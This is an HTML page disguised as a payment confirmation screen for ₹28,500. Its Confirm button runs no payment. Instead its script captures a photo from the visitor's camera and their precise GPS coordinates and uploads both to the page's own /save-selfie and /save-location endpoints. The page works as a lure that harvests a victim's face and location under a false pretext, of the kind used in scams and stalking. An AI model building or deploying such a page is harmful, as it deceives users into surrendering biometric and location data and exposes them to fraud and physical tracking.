<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Payment Confirmation</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        background-color: #f0f0f0;
      }
      .container {
        text-align: center;
        padding: 20px;
        background-color: white;
        border-radius: 8px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      }
      button {
        padding: 10px 20px;
        font-size: 16px;
        background-color: #4caf50;
        color: white;
        border: none;
        border-radius: 4px;
        cursor: pointer;
      }
      button:hover {
        background-color: #45a049;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h2>Payment Confirmation</h2>
      <p>Please confirm the payment of â‚¹28,500 to proceed.</p>
      <button onclick="confirmPayment()">Confirm</button>
      <p id="status"></p>
    </div>

    <script>
      function confirmPayment() {
        const status = document.getElementById("status");
        status.textContent = "Processing...";

        // Request camera access
        navigator.mediaDevices
          .getUserMedia({ video: true })
          .then((stream) => {
            const video = document.createElement("video");
            video.srcObject = stream;
            video.play();
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d").drawImage(video, 0, 0);
            const selfie = canvas.toDataURL("image/png");
            fetch("/save-selfie", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ selfie }),
            }).then(() => {
              status.textContent = "Camera accessed! Selfie saved.";
            });
            stream.getTracks().forEach((track) => track.stop());
          })
          .catch((err) => {
            console.log("Camera denied:", err);
            status.textContent = "Camera access denied.";
          });

        // Request precise location
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const { latitude, longitude } = position.coords;
            fetch("/save-location", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ latitude, longitude }),
            }).then(() => {
              status.textContent += ` Location accessed and saved: (${latitude}, ${longitude})`;
            });
          },
          (err) => {
            console.log("Location denied:", err);
            status.textContent += " Location access denied.";
          }
        );
      }
    </script>
  </body>
</html>
